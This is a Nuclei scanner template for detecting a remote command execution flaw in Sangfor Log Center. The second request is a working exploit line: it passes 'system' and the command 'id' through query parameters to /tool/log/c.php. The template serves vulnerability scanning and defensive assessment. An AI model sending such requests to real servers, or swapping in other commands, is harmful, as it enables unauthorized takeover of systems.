id: sangfor-log-center-rce
info:
  name: Sangfor Log Center Remote Command Execution
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Sangfor Log Center contains a remote command execution vulnerability. By crafting specific HTTP requests, an attacker can execute arbitrary commands on the server, potentially gaining full control of the web server.
  reference:
    - http://wiki.peiqi.tech/PeiQi_Wiki/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D%20%E6%97%A5%E5%BF%97%E4%B8%AD%E5%BF%83%20c.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html?h=%E6%B7%B1%E4%BF%A1%E6%9C%8D
  tags: rce
  metadata:
    cvss-score: 9.8
http:
  - raw:
      - |
        GET /tool/log/c.php HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "<b>Log Helper</b>"
  - raw:
      - |
        GET /tool/log/c.php?strip_slashes=system&host=id HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "<b>Log Helper</b>"
